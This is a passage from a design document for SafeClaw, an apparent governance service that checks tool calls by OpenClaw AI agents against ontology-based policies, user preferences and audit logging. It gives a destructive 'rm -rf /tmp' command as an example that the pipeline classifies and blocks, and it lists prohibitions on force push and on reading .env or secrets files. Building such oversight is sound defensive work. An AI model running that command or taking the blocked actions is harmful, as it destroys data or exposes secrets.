│   │   └── dependency_checker.py    # Check action dependencies (test before push)
│   ├── audit/
│   │   ├── __init__.py
│   │   ├── logger.py                # Append-only structured audit log
│   │   ├── models.py                # DecisionRecord Pydantic model
│   │   └── reporter.py              # Generate human-readable audit reports
│   ├── api/
│   │   ├── __init__.py
│   │   ├── routes.py                # FastAPI route definitions
│   │   ├── models.py                # Request/response Pydantic models
│   │   └── middleware.py            # Auth, CORS, error handling
│   ├── ontologies/
│   │   ├── safeclaw-agent.ttl       # Agent behavior ontology
│   │   ├── safeclaw-policy.ttl      # Domain policy ontology
│   │   ├── shapes/                  # SHACL constraint shapes
│   │   │   ├── action-shapes.ttl    # Action validation shapes
│   │   │   ├── command-shapes.ttl   # Shell command constraints
│   │   │   └── message-shapes.ttl   # Message policy shapes
│   │   └── users/                   # Per-user preference files
│   │       ├── user-default.ttl
│   │       └── user-{id}.ttl
│   └── cli/
│       ├── __init__.py
│       ├── main.py                  # Click/Typer CLI entrypoint
│       ├── serve.py                 # `safeclaw serve` command
│       ├── audit_cmd.py             # `safeclaw audit` commands
│       ├── policy_cmd.py            # `safeclaw policy add/remove` commands
│       └── pref_cmd.py              # `safeclaw pref set/get` commands
├── tests/
│   ├── test_engine.py
│   ├── test_shacl_validation.py
│   ├── test_action_classifier.py
│   └── test_audit.py
├── pyproject.toml                   # Python project config (uv/pip)
├── Dockerfile
└── docker-compose.yml               # Service + optional Jena Fuseki
```

**2. openclaw-safeclaw-plugin/ (TypeScript — the bridge, ~50 lines)**
```
openclaw-safeclaw-plugin/
├── index.ts                         # The entire plugin — forwards hooks via HTTP
├── package.json                     # OpenClaw plugin manifest
└── README.md
```

### 5.2 The Constraint Checking Pipeline

Every tool call goes through this pipeline in the `before_tool_call` hook:

```
Tool Call Proposed by LLM
         │
         ▼
┌─────────────────────────┐
│ 1. ACTION CLASSIFICATION │
│                          │
│ Map tool name + params   │
│ to ontology action class │
│                          │
│ "exec" + "rm -rf /tmp"   │
│   → sc:DeleteFile        │
│   → sc:CriticalRisk      │
│   → sc:isReversible false │
└────────────┬─────────────┘
             │
             ▼
┌─────────────────────────┐
│ 2. POLICY CHECK          │
│                          │
│ Query policy ontology:   │
│ Are there Prohibitions   │
│ matching this action?    │
│                          │
│ SPARQL: SELECT ?policy   │
│ WHERE { ?policy a        │
│   sp:Prohibition ;       │
│   sp:appliesTo ?action . │
│   FILTER matches(...) }  │
│                          │
│ If match → BLOCK + reason│
└────────────┬─────────────┘
             │
             ▼
┌─────────────────────────┐
│ 3. PREFERENCE CHECK      │
│                          │
│ Query user preferences:  │
│ Does user require        │
│ confirmation for this    │
│ action type?             │
│                          │
│ Check: autonomyLevel,    │
│ confirmBeforeDelete,     │
│ neverModifyPaths, etc.   │
│                          │
│ If violated → BLOCK      │
└────────────┬─────────────┘
             │
             ▼
┌─────────────────────────┐
│ 4. DEPENDENCY CHECK      │
│                          │
│ Does this action require │
│ a prerequisite action    │
│ that hasn't happened?    │
│                          │
│ Check session action log:│
│ "git push" requires      │
│ "run tests" first        │
│                          │
│ If unmet → BLOCK         │
└────────────┬─────────────┘
             │
             ▼
┌─────────────────────────┐
│ 5. REASONER VALIDATION   │
│                          │
│ Run eye-js with:         │
│ - Current action triples │
│ - Policy ontology        │
│ - User preferences       │
│ - Session history        │
│ - OWL 2 RL rules         │
│                          │
│ Check for:               │
│ - Logical inconsistency  │
│ - Derived prohibitions   │
│ - Transitive violations  │
│                          │
│ If inconsistent → BLOCK  │
└────────────┬─────────────┘
             │
             ▼
┌─────────────────────────┐
│ 6. DECISION & AUDIT      │
│                          │
│ Record decision:         │
│ - Action proposed        │
│ - Constraints checked    │
│ - Result (allow/block)   │
│ - Justification (which   │
│   ontology triples)      │
│ - Timestamp              │
│                          │
│ Return to OpenClaw:      │
│ { block: false } or      │
│ { block: true,           │
│   blockReason: "..." }   │
└──────────────────────────┘
```

### 5.3 Knowledge Graph Context Injection

The `before_agent_start` hook queries the knowledge graph and injects relevant context into the system prompt:

```typescript
// Pseudocode for context injection
async function beforeAgentStart(event, ctx) {
  const userId = resolveUserId(ctx);

  // 1. Load user preferences as natural language constraints
  const preferences = await query(`
    SELECT ?prefType ?property ?value WHERE {
      ?user su:hasPreference ?pref .
      ?pref a ?prefType .
      ?pref ?property ?value .
      FILTER(?user = su:${userId})
    }
  `);

  // 2. Load active policies as natural language rules
  const policies = await query(`
    SELECT ?policy ?type ?reason WHERE {
      ?policy a ?type ; sp:reason ?reason .
      ?type rdfs:subClassOf sp:Constraint .
    }
  `);

  // 3. Load session-relevant facts from knowledge graph
  const facts = await query(`
    SELECT ?subject ?predicate ?object WHERE {
      ?subject ?predicate ?object .
      # filter to session-relevant entities
    }
  `);

  // 4. Build constraint summary for the LLM
  const constraintPrompt = buildConstraintPrompt(preferences, policies, facts);

  return {
    prependContext: constraintPrompt,
  };
}
```

The injected context looks like:

```
## SafeClaw Governance Context

### Your Behavioral Constraints
You are operating under SafeClaw governance. Every action you propose
will be validated against formal ontological constraints before execution.
Actions that violate constraints will be blocked with an explanation.

### Active User Preferences (user: henrik)
- Autonomy level: moderate (confirm before irreversible actions)
- Always run tests before git push
- Never modify files matching: .env*, credentials*, secrets*
- Confirm before deleting any file
- Preferred language: TypeScript
- Max files per commit: 10

### Active Domain Policies
- PROHIBITION: No force push (reason: can destroy shared history)
- PROHIBITION: No .env file access (reason: may contain secrets)
- OBLIGATION: Run tests before push (reason: CI gate)
- OBLIGATION: Business hours only for deploys (09:00-17:00)

### Session Facts
- Last test run: 14:32 UTC — PASSED (all 47 tests)
- Current branch: feature/auth-module
- Uncommitted changes: 3 files
- Last commit: "Add JWT validation middleware"
```

This gives the LLM **awareness** of constraints, so it can plan around them rather than constantly hitting blocks. The formal checks still run — the prompt is informational, not the enforcement mechanism.

---

## 6. AUDIT SYSTEM DESIGN

### 6.1 Decision Record Schema

Every constraint check produces a decision record:

```typescript
interface DecisionRecord {
  // Identity
  id: string;                        // UUID
  timestamp: string;                 // ISO 8601
  sessionId: string;
  userId: string;

  // What was proposed
  action: {
    toolName: string;                // OpenClaw tool name
    params: Record<string, unknown>; // Tool parameters
    ontologyClass: string;           // Mapped action class URI
    riskLevel: string;               // From ontology
    isReversible: boolean;           // From ontology
    affectsScope: string;            // local/shared/external
  };

  // What was decided
  decision: 'allowed' | 'blocked' | 'allowed_with_warning';

  // Why (the key differentiator — machine-readable justification)
  justification: {
    constraintsChecked: Array<{
      constraintUri: string;         // Ontology URI of the constraint
      constraintType: string;        // Prohibition/Obligation/Permission
      result: 'satisfied' | 'violated' | 'not_applicable';
      reason: string;                // Human-readable from ontology
    }>;
    reasonerOutput?: {
      consistent: boolean;
      derivedFacts: string[];        // New facts the reasoner inferred
      executionTimeMs: number;
    };
    preferencesApplied: Array<{
      preferenceUri: string;
      value: string;
      effect: string;                // What the preference caused
    }>;
  };

  // Context
  sessionActionHistory: string[];    // Previous actions in this session
  knowledgeGraphSnapshot?: string;   // Optional: relevant subgraph
}
```

### 6.2 Audit Storage

```
~/.safeclaw/
├── audit/
│   ├── 2026-02-16/
│   │   ├── session-abc123.jsonl     # One JSON line per decision
│   │   └── session-def456.jsonl
│   ├── 2026-02-17/
│   │   └── ...
│   └── index.json                   # Session index for quick lookup
├── ontologies/
│   ├── safeclaw-agent.ttl
│   ├── safeclaw-policy.ttl
│   ├── safeclaw-rules.n3
│   └── users/
│       └── user-henrik.ttl
└── config.json                      # SafeClaw-specific configuration
```

- **Append-only JSONL**: Each decision is one line, never modified after writing
- **Daily rotation**: Easy to archive, ship to external systems, or audit
- **Machine-readable**: Can be queried, aggregated, visualized
- **Ontology URIs in every record**: Full traceability back to formal constraints

### 6.3 Audit CLI Commands

```bash
# View recent decisions
safeclaw audit --last 20

# Show all blocked actions
safeclaw audit --blocked --today

# Show decisions for a specific session
safeclaw audit --session abc123

# Generate human-readable report
safeclaw audit report --date 2026-02-16 --format markdown

# Show constraint violation statistics
safeclaw audit stats --last-week

# Export for compliance
safeclaw audit export --format csv --from 2026-01-01 --to 2026-02-16
```

---

## 7. USER & ORGANIZATION MANAGEMENT

Since SafeClaw is a standalone service, it needs proper identity, access control, and multi-tenancy.

### 7.1 Data Model

```
┌─────────────────────────────────────────────────────────┐
│                    Organization                          │
│  id, name, slug, plan (free/pro/enterprise)             │
│  created_at, settings                                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │ User         │  │ User         │  │ User         │  │
│  │ role: admin  │  │ role: editor │  │ role: viewer  │  │
│  └──────┬───────┘  └──────┬───────┘  └──────────────┘  │
│         │                 │                              │
│  ┌──────▼───────┐  ┌─────▼────────┐                    │
│  │ API Key 1    │  │ API Key 2    │                    │
│  │ scope: full  │  │ scope: agent │                    │
│  └──────┬───────┘  └──────┬───────┘                    │
│         │                 │                              │
│  ┌──────▼───────┐  ┌─────▼────────┐                    │
│  │ Agent "prod" │  │ Agent "dev"  │                    │
│  │ (OpenClaw)   │  │ (OpenClaw)   │                    │
│  └──────────────┘  └──────────────┘                    │
│                                                          │
│  ┌─────────────────────────────────────────────┐        │
│  │ Organization-level resources                 │        │
│  │  ├── Policies (shared across all agents)     │        │
│  │  ├── Ontologies (shared domain model)        │        │
│  │  ├── SHACL Shapes (shared constraints)       │        │
│  │  └── Audit logs (all agents, all users)      │        │
│  └─────────────────────────────────────────────┘        │
│                                                          │
│  ┌─────────────────────────────────────────────┐        │
│  │ Per-user resources                           │        │
│  │  ├── Preferences (OWL triples, per user)     │        │
│  │  ├── Personal policy overrides               │        │
│  │  └── Session history                          │        │
│  └─────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────┘
```

### 7.2 Roles & Permissions

| Role | Description | Permissions |
|---|---|---|
| **owner** | Organization owner | Full access. Can delete org, manage billing |
| **admin** | Administrator | User management, policy management, API key management, audit reading |
| **editor** | Policy manager | Add/edit policies and SHACL shapes, modify ontologies, manage own preferences |
| **agent** | Agent service account | Only constraint checking endpoints (`/evaluate/*`, `/context/*`, `/record/*`, `/log/*`). Cannot modify policies or manage users |
| **viewer** | Auditor / observer | Read-only access: audit logs, policies, preferences. Cannot modify anything |

### 7.3 Authentication

```python
# safeclaw/api/auth.py

# --- API Key authentication (for agents) ---
# Each API key is tied to an organization and role
# Header: Authorization: Bearer sc_live_abc123...

@dataclass
class APIKey:
    id: str
    key_hash: str                # bcrypt hash, not plaintext
    organization_id: str
    created_by_user_id: str
    name: str                    # "prod-agent-1", "dev-testing"
    scope: Literal["full", "agent", "readonly"]
    agent_id: str | None         # If tied to a specific agent
    created_at: datetime
    last_used_at: datetime | None
    expires_at: datetime | None
    is_active: bool

# --- User authentication (for dashboard/CLI) ---
# Options, in priority order:

# 1. OAuth2 / OIDC (recommended for enterprise)
#    - Google Workspace, Azure AD, Okta, Keycloak
#    - FastAPI + authlib
#    - Automatic organization creation based on domain

# 2. Email + password (simple variant)
#    - bcrypt hashing
#    - JWT access + refresh tokens
#    - Email verification

# 3. CLI token (for safeclaw CLI)
#    - `safeclaw login` → browser OAuth flow → local token
#    - Token stored at ~/.safeclaw/credentials.json
```

### 7.4 Multi-Tenancy & Data Isolation

```python
# Every request is associated with an organization.
# Data is ALWAYS isolated by organization.

# --- Ontologies ---
# Each org has its own ontology directory:
# /data/orgs/{org_id}/ontologies/
#   ├── safeclaw-agent.ttl        (org-specific, copied from defaults)
#   ├── safeclaw-policy.ttl       (org policies)
#   ├── shapes/                    (org SHACL shapes)
#   └── users/
#       ├── user-{id}.ttl          (user preferences)
#       └── ...

# --- owlready2 isolation ---
# Each org gets its own owlready2 World() instance
# This ensures ontologies do not interfere with each other
class OrgEngine:
    def __init__(self, org_id: str):
        self.world = owlready2.World()  # Isolated OWL world
        self.ontology = self.world.get_ontology(f"file://{org_ontology_path}")
        self.ontology.load()

# --- Database ---
# PostgreSQL: org_id is a foreign key on every table
# Row-level security (RLS) ensures queries only see their own org's data

# --- Audit logs ---
# Always filtered by org_id + user_id + agent_id
# Users can only see their own org's logs
```

### 7.5 API Endpoints: User Management

```
# --- Organization ---
POST   /api/v1/orgs                          # Create new organization
GET    /api/v1/orgs/{org_id}                 # Org info
PATCH  /api/v1/orgs/{org_id}                 # Update org settings
DELETE /api/v1/orgs/{org_id}                 # Delete org (owner only)

# --- Users ---
POST   /api/v1/orgs/{org_id}/users           # Invite user (sends email)
GET    /api/v1/orgs/{org_id}/users           # List users
GET    /api/v1/orgs/{org_id}/users/{user_id} # User info
PATCH  /api/v1/orgs/{org_id}/users/{user_id} # Change role
DELETE /api/v1/orgs/{org_id}/users/{user_id} # Remove user

# --- API Keys ---
POST   /api/v1/orgs/{org_id}/api-keys        # Create new API key
GET    /api/v1/orgs/{org_id}/api-keys        # List API keys
DELETE /api/v1/orgs/{org_id}/api-keys/{id}   # Revoke API key
POST   /api/v1/orgs/{org_id}/api-keys/{id}/rotate  # Rotate key

# --- Agents (registered OpenClaw instances) ---
POST   /api/v1/orgs/{org_id}/agents          # Register agent
GET    /api/v1/orgs/{org_id}/agents          # List agents
GET    /api/v1/orgs/{org_id}/agents/{id}     # Agent info + status
PATCH  /api/v1/orgs/{org_id}/agents/{id}     # Update agent settings
DELETE /api/v1/orgs/{org_id}/agents/{id}     # Remove agent

# --- User Preferences ---
GET    /api/v1/preferences/me                # My preferences
PUT    /api/v1/preferences/me                # Update my preferences
GET    /api/v1/preferences/{user_id}         # User preferences (admin)
PUT    /api/v1/preferences/{user_id}         # Update preferences (admin)

# --- Authentication ---
POST   /api/v1/auth/login                    # Email + password → JWT
POST   /api/v1/auth/refresh                  # Refresh token
POST   /api/v1/auth/logout                   # Revoke token
GET    /api/v1/auth/oauth/{provider}         # OAuth2 redirect
GET    /api/v1/auth/oauth/{provider}/callback # OAuth2 callback
POST   /api/v1/auth/cli-token                # Issue CLI token
```

### 7.6 Agent Registration

When an OpenClaw agent connects to the SafeClaw service, it must register itself:

```python
# Agent registration is done via API key.
# The API key determines the organization and permissions.

# The OpenClaw plugin sends on first connection:
POST /api/v1/agents/register
{
    "name": "prod-agent-1",
    "api_key": "sc_live_abc123...",
    "openclaw_version": "2.1.0",
    "hostname": "worker-3.example.com",
    "capabilities": ["exec", "write", "read", "web_search", "browser"]
}

# SafeClaw responds:
{
    "agent_id": "ag_xyz789",
    "org_id": "org_abc",
    "policies_hash": "sha256:...",     # Agent knows if policies have changed
    "shapes_hash": "sha256:...",       # Agent knows if SHACL shapes have changed
    "sync_interval_sec": 60
}

# From then on, the agent adds to every request:
# Header: X-Agent-Id: ag_xyz789
# Header: Authorization: Bearer sc_live_abc123...
```

### 7.7 Dashboard Views (FastHTML)

```
SafeClaw Dashboard
├── Overview
│   ├── Agents online / offline
│   ├── Decisions today (allowed / blocked / warnings)
│   ├── Top violated constraints
│   └── Recent activity feed
│
├── Agents
│   ├── Agent list + status (online/offline, last seen)
│   ├── Agent detail → live activity, session history
│   └── Agent settings (override policies per agent)
│
├── Policies
│   ├── Policy list (Prohibitions, Obligations, Permissions)
│   ├── Add/edit/delete policies
│   ├── SHACL shape editor (visual or Turtle)
│   └── Policy test: "Would this action be blocked?"
│
├── Preferences
│   ├── Organization defaults
│   ├── Per-user preference editor
│   └── Preference inheritance (org → user → agent)
│
├── Audit
│   ├── Decision log (filterable by agent, user, action, date)
│   ├── Decision detail (full ontological justification)
│   ├── Statistics & charts
│   └── Export (CSV, JSON, compliance report)
│
├── Ontology Map (see Section 7.10)
│   ├── Interactive node graph (D3.js force-directed)
│   ├── Class hierarchy tree view
│   ├── SHACL constraint overlay
│   ├── Live session facts layer
│   ├── SPARQL query console
│   └── Ontology file editor
│
├── Automation (see Section 7.12)
│   ├── Cron Jobs
│   │   ├── Job list (name, schedule, session type, status, last run)
│   │   ├── Create / edit job (visual cron builder + preview)
│   │   ├── Run history per job (success/error, duration, output)
│   │   ├── Manual run trigger
│   │   ├── Governance overlay: which policies apply to cron-triggered actions
│   │   └── Delivery config (announce, webhook, channel targeting)
│   ├── Heartbeat
│   │   ├── Heartbeat status (interval, active hours, last run)
│   │   ├── HEARTBEAT.md editor (checklist of periodic tasks)
│   │   ├── Run history (what the agent checked, decisions made)
│   │   └── Active hours configuration
│   └── Scheduled Reports
│       ├── Compliance report schedule (daily/weekly/monthly)
│       ├── Audit digest delivery (email, Slack, webhook)
│       └── Policy violation alerts (real-time or batched)
│
├── Organization
│   ├── Users & roles
│   ├── API keys
│   ├── Billing (SaaS mode)
│   └── Settings
│
└── My Profile
    ├── My preferences
    ├── My sessions
    └── My API keys
```

### 7.8 Python Data Model

```python
# safeclaw/models/user.py
from sqlalchemy import Column, String, DateTime, ForeignKey, Enum, Boolean
from sqlalchemy.orm import relationship

class Organization(Base):
    __tablename__ = "organizations"
    id = Column(String, primary_key=True, default=generate_id("org"))
    name = Column(String, nullable=False)
    slug = Column(String, unique=True, nullable=False)
    plan = Column(Enum("free", "pro", "enterprise"), default="free")
    settings = Column(JSON, default={})
    created_at = Column(DateTime, default=utcnow)

    users = relationship("OrgMembership", back_populates="organization")
    agents = relationship("Agent", back_populates="organization")
    api_keys = relationship("APIKey", back_populates="organization")

class User(Base):
    __tablename__ = "users"
    id = Column(String, primary_key=True, default=generate_id("usr"))
    email = Column(String, unique=True, nullable=False)
    name = Column(String)
    password_hash = Column(String, nullable=True)  # Null if OAuth
    oauth_provider = Column(String, nullable=True)
    oauth_id = Column(String, nullable=True)
    created_at = Column(DateTime, default=utcnow)
    last_login_at = Column(DateTime, nullable=True)

    memberships = relationship("OrgMembership", back_populates="user")

class OrgMembership(Base):
    __tablename__ = "org_memberships"
    id = Column(String, primary_key=True)
    organization_id = Column(String, ForeignKey("organizations.id"))
    user_id = Column(String, ForeignKey("users.id"))
    role = Column(Enum("owner", "admin", "editor", "viewer"), nullable=False)
    invited_at = Column(DateTime, default=utcnow)
    accepted_at = Column(DateTime, nullable=True)

    organization = relationship("Organization", back_populates="users")
    user = relationship("User", back_populates="memberships")

class Agent(Base):
    __tablename__ = "agents"
    id = Column(String, primary_key=True, default=generate_id("ag"))
    organization_id = Column(String, ForeignKey("organizations.id"))
    name = Column(String, nullable=False)
    hostname = Column(String, nullable=True)
    openclaw_version = Column(String, nullable=True)
    capabilities = Column(JSON, default=[])
    is_online = Column(Boolean, default=False)
    last_seen_at = Column(DateTime, nullable=True)
    policy_overrides = Column(JSON, default={})  # Agent-specific rules
    created_at = Column(DateTime, default=utcnow)

    organization = relationship("Organization", back_populates="agents")

class APIKey(Base):
    __tablename__ = "api_keys"
    id = Column(String, primary_key=True, default=generate_id("key"))
    organization_id = Column(String, ForeignKey("organizations.id"))
    created_by_user_id = Column(String, ForeignKey("users.id"))
    agent_id = Column(String, ForeignKey("agents.id"), nullable=True)
    name = Column(String, nullable=False)
    key_prefix = Column(String, nullable=False)   # "sc_live_abc" — visible prefix
    key_hash = Column(String, nullable=False)       # bcrypt hash
    scope = Column(Enum("full", "agent", "readonly"), nullable=False)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=utcnow)
    last_used_at = Column(DateTime, nullable=True)
    expires_at = Column(DateTime, nullable=True)

    organization = relationship("Organization", back_populates="api_keys")
```

### 7.9 Preference Inheritance

Preferences are inherited at three levels. A more specific level overrides the more general one:

```
Organization defaults (safeclaw-policy.ttl)
  └── override → User preferences (user-{id}.ttl)
      └── override → Agent-specific rules (agent policy_overrides)
```

```python
# safeclaw/engine/preference_resolver.py

def resolve_preferences(org_id: str, user_id: str, agent_id: str) -> Preferences:
    """Resolve preferences at three levels."""
    # 1. Organization defaults
    org_prefs = load_org_defaults(org_id)

    # 2. User preferences (override org)
    user_prefs = load_user_preferences(org_id, user_id)

    # 3. Agent preferences (override user)
    agent_prefs = load_agent_overrides(org_id, agent_id)

    # Merge: agent > user > org
    return merge_preferences(org_prefs, user_prefs, agent_prefs)
```

### 7.10 Interactive Ontology Map

The dashboard exposes a visual, interactive map of the entire ontology — making the governance structure transparent and explorable for non-technical users. Built with **FastHTML + HTMX** for server-driven page updates and **D3.js** (force-directed graph) for client-side rendering.

#### 7.10.1 Architecture

```
┌──────────────────────────────────────────────────────────┐
│  Browser                                                  │
│  ┌─────────────────────────────────────────────────────┐ │
│  │  D3.js Force-Directed Graph                         │ │
│  │                                                     │ │
│  │   ┌─────┐    subClassOf    ┌──────────┐            │ │
│  │   │Action├───────────────→│FileAction │            │ │
│  │   └──┬──┘                  └─────┬────┘            │ │
│  │      │ subClassOf                │ subClassOf      │ │
│  │      ▼                           ▼                 │ │
│  │   ┌──────────┐           ┌──────────┐             │ │
│  │   │ShellAction│           │DeleteFile │  ⚠ Critical│ │
│  │   └──────────┘           └──────────┘             │ │
│  │                                                     │ │
│  │   Click node → detail panel (HTMX partial swap)    │ │
│  └─────────────────────────────────────────────────────┘ │
│  ┌─────────────────────────────────────────────────────┐ │
│  │  Detail Panel (HTMX)                                │ │
│  │  ├── Node properties (risk level, reversibility)    │ │
│  │  ├── SHACL constraints targeting this class         │ │
│  │  ├── Audit history: recent decisions for this type  │ │
│  │  └── Connected nodes (expand neighbors)             │ │
│  └─────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────┘
         │ HTMX requests                    ▲ HTML partials
         ▼                                  │
┌──────────────────────────────────────────────────────────┐
│  SafeClaw FastAPI + FastHTML                               │
│  ┌────────────────────────────────────────────────────┐  │
│  │  GET /dashboard/ontology-map                        │  │
│  │  → Full page: FastHTML layout + D3.js canvas        │  │
│  │                                                     │  │
│  │  GET /api/v1/ontology/graph?format=d3               │  │
│  │  → JSON: { nodes: [...], links: [...] }             │  │
│  │                                                     │  │
│  │  GET /api/v1/ontology/node/{uri}                    │  │
│  │  → HTML partial: node detail panel (HTMX swap)      │  │
│  │                                                     │  │
│  │  GET /api/v1/ontology/search?q=Delete               │  │
│  │  → JSON: matching nodes for autocomplete            │  │
│  └────────────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │
│  │  graph_builder.py                                   │  │
│  │  - Reads owlready2 World() for current org          │  │
│  │  - Extracts: classes, properties, individuals       │  │
│  │  - Computes layout hints (hierarchy depth, degree)  │  │
│  │  - Annotates with SHACL constraints + audit stats   │  │
│  │  - Returns D3-compatible JSON                       │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

#### 7.10.2 Node Types & Visual Encoding

| Node Type | Shape | Color | Example |
|---|---|---|---|
| OWL Class | Circle | Blue (size = subclass count) | `sc:Action`, `sc:FileAction` |
| SHACL Shape | Hexagon | Orange | `sc:ForbiddenCommandShape` |
| Policy (Prohibition) | Square | Red | `sp:NeverDeleteWithoutBackup` |
| Policy (Obligation) | Square | Green | `sp:MustRunTestsBeforePush` |
| Policy (Permission) | Square | Gray | `sp:AllowReadAnywhere` |
| User Preference | Diamond | Purple | `su:confirmBeforeDelete` |
| Risk Level | Badge on parent | Red/Orange/Yellow/Gray | `CriticalRisk` on `DeleteFile` |
| Active Session Fact | Dot | Bright green (pulsing) | `tests_passed_at_14:32` |

#### 7.10.3 Edge Types

| Edge Type | Style | Meaning |
|---|---|---|
| `rdfs:subClassOf` | Solid arrow | Class hierarchy |
| `owl:ObjectProperty` | Dashed arrow, labeled | e.g., `hasRiskLevel`, `affectsScope` |
| `sh:targetClass` | Dotted orange line | SHACL shape targets this class |
| `sp:appliesTo` | Dotted red line | Policy applies to this action type |
| `su:hasPreference` | Dotted purple line | User preference on this action |

#### 7.10.4 Interaction Model

```
User Interactions:
─────────────────
1. Pan & Zoom         → D3.js zoom behavior (scroll wheel, drag background)
2. Click node         → HTMX: GET /api/v1/ontology/node/{uri}
                        → Swaps detail panel with node properties,
                          constraints, and recent audit entries
3. Hover node         → Tooltip: name, type, risk level, constraint count
4. Double-click node  → Expand neighbors (load connected nodes not yet shown)
5. Search bar         → Autocomplete: GET /api/v1/ontology/search?q=...
                        → Centers graph on selected node
6. Filter toggles     → Show/hide layers:
                        □ Classes  □ Shapes  □ Policies  □ Preferences
                        □ Session Facts  □ Audit Heatmap
7. Right-click node   → Context menu:
                        - "Show audit history for this type"
                        - "Test action against this constraint"
                        - "Edit policy" (if policy node, editor role)
8. Drag node          → Pin position (persisted in localStorage)
```

#### 7.10.5 View Modes

**1. Hierarchy View** — Tree layout showing class inheritance
```
Action
├── FileAction
│   ├── ReadFile         [Low Risk]
│   ├── WriteFile        [Medium Risk] ← 2 SHACL shapes
│   └── DeleteFile       [Critical]   ← 3 prohibitions, 1 obligation
├── ShellAction
│   └── ExecuteCommand   [High Risk]  ← 1 prohibition (ForbiddenCommandShape)
├── NetworkAction
│   └── WebFetch         [Medium Risk]
├── MessageAction
│   └── SendMessage      [High Risk]  ← irreversible
└── BrowserAction
```

**2. Force Graph View** — Network layout showing all relationships
- Classes cluster by hierarchy depth
- Policies and shapes float near their target classes
- Active session facts glow at the periphery
- Edge thickness proportional to audit event count (frequently checked = thicker)

**3. Audit Heatmap Overlay** — Color intensity on nodes
- Shade nodes by decision frequency (dark = many decisions)
- Red glow = high block rate (many violations)
- Green glow = always allowed
- Helps identify which parts of the ontology are most active

#### 7.10.6 Data API Endpoints

```python
# safeclaw/api/ontology_map.py

@router.get("/api/v1/ontology/graph")
async def get_ontology_graph(
    format: Literal["d3", "cytoscape"] = "d3",
    layers: list[str] = Query(default=["classes", "shapes", "policies"]),
    depth: int = Query(default=3, ge=1, le=10),
    root: str | None = None,  # URI to center the graph on
    org_id: str = Depends(get_current_org),
) -> OntologyGraphResponse:
    """
    Returns the ontology as a node-link graph for visualization.

    Reads from the org's owlready2 World(), extracts classes,
    properties, SHACL shapes, and policies, then formats as
    D3-compatible JSON: { nodes: [...], links: [...] }.
    """
    engine = get_org_engine(org_id)
    graph = build_ontology_graph(
        world=engine.world,
        layers=layers,
        depth=depth,
        root_uri=root,
    )
    # Annotate with audit statistics
    audit_stats = await get_audit_stats_by_class(org_id)
    for node in graph.nodes:
        stats = audit_stats.get(node["uri"])
        if stats:
            node["auditCount"] = stats.total
            node["blockRate"] = stats.block_rate
    return graph

@router.get("/api/v1/ontology/node/{uri:path}")
async def get_node_detail(
    uri: str,
    org_id: str = Depends(get_current_org),
) -> HTMLResponse:
    """
    Returns an HTML partial (for HTMX swap) with full node details:
    - All RDF properties
    - SHACL constraints targeting this node
    - Recent audit decisions involving this action type
    - Connected nodes (neighbors in the graph)
    """
    engine = get_org_engine(org_id)
    node = describe_node(engine.world, uri)
    constraints = get_constraints_for_class(engine.shacl_shapes, uri)
    recent_audit = await get_recent_audit_for_class(org_id, uri, limit=10)
    return render_node_detail(node, constraints, recent_audit)

@router.get("/api/v1/ontology/search")
async def search_ontology(
    q: str,
    org_id: str = Depends(get_current_org),
    limit: int = 20,
) -> list[OntologySearchResult]:
    """Fuzzy search across class names, labels, and descriptions."""
    engine = get_org_engine(org_id)
    return search_ontology_nodes(engine.world, q, limit=limit)
```

#### 7.10.7 Python Graph Builder

```python
# safeclaw/dashboard/graph_builder.py

from owlready2 import World, ThingClass
from dataclasses import dataclass

@dataclass
class GraphNode:
    id: str          # URI
    label: str       # rdfs:label or class name
    type: str        # "class", "shape", "policy", "preference", "fact"
    group: str       # For D3 color grouping
    risk: str | None # Risk level if applicable
    depth: int       # Hierarchy depth (for layout hints)
    size: int        # Number of subclasses (visual weight)

@dataclass
class GraphLink:
    source: str      # URI
    target: str      # URI
    type: str        # "subClassOf", "objectProperty", "targetClass", etc.
    label: str | None

def build_ontology_graph(
    world: World,
    layers: list[str],
    depth: int = 3,
    root_uri: str | None = None,
) -> dict:
    """
    Walk the owlready2 World and extract a D3-compatible graph.

    Strategy:
    1. Start from owl:Thing (or root_uri if provided)
    2. BFS through subClassOf up to `depth` levels
    3. For each class, collect:
       - Object properties where it's domain or range
       - SHACL shapes targeting it (sh:targetClass)
       - Policies applying to it (sp:appliesTo)
       - Data properties (risk level, reversibility, etc.)
    4. Return { nodes: [...], links: [...] }
    """
    nodes = []
    links = []
    visited = set()

    # ... BFS traversal of ontology classes ...
    # ... Add SHACL shapes as nodes if "shapes" in layers ...
    # ... Add policies as nodes if "policies" in layers ...

    return {
        "nodes": [asdict(n) for n in nodes],
        "links": [asdict(l) for l in links],
    }
```

---

## 8. IMPLEMENTATION PHASES

### Phase 1: Foundation (Weeks 1-3)

**Goal**: Get the basic plugin structure working with OpenClaw, load ontologies, run simple constraint checks.

#### 1.1 Project Scaffolding
- [ ] Create safeclaw repository (NOT a fork — separate repo, installed as OpenClaw plugin)
- [ ] Create plugin directory structure (as in Section 5.1)
- [ ] Set up TypeScript build with eye-js, N3.js, Comunica dependencies
- [ ] Create OpenClaw plugin manifest (`manifest.json`)
- [ ] Register plugin with OpenClaw's plugin system
- [ ] Write plugin entry point that registers all hooks
- [ ] **Define `SafeClawEngine` interface** — all logic behind this interface from day one
- [ ] Implement `EmbeddedEngine` as the first (default) engine implementation

#### 1.2 Knowledge Graph Layer
- [ ] Implement `knowledge-graph.ts`: load Turtle files into N3.Store
- [ ] Implement ontology file watcher (reload on change)
- [ ] Create the three base ontology files (agent, policy, user-default)
- [ ] Write unit tests: load ontologies, query basic patterns
- [ ] Implement per-user ontology isolation (separate N3.Store per user)

#### 1.3 Basic Constraint Checking
- [ ] Implement `action-classifier.ts`: map OpenClaw tool names to ontology action classes
  - `exec` → ShellAction (parse command for subclass: DeleteFile, GitPush, etc.)
  - `write` → WriteFile
  - `read` → ReadFile
  - `edit` → EditFile
  - `apply_patch` → EditFile
  - `web_fetch` → NetworkAction
  - `web_search` → NetworkAction
  - `message` → MessageAction
  - `browser` → BrowserAction
- [ ] Implement `policy-checker.ts`: query N3.Store for matching Prohibitions
- [ ] Implement `preference-checker.ts`: query user preferences
